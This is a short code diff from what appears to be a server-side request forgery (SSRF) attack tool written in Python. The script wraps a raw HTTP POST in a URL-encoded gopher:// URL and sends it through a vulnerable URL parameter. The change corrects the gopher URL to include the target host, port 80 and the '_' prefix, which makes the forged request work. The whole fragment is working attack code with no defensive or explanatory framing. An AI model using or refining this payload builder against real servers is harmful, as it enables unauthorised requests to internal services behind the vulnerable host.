@@ -30,7 +30,7 @@ def handle_client(client_socket):
         gopher_data = "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n\r\n{}".format(url, args.host, content_length, request_body)
         gopher_data_encoded = urllib.parse.quote(gopher_data, safe='')
 
-        target_url = args.url + 'gopher://' + gopher_data_encoded
+        target_url = args.url + 'gopher://'+ args.host +":80/_" + gopher_data_encoded
 
         try:
             response = requests.get(target_url)
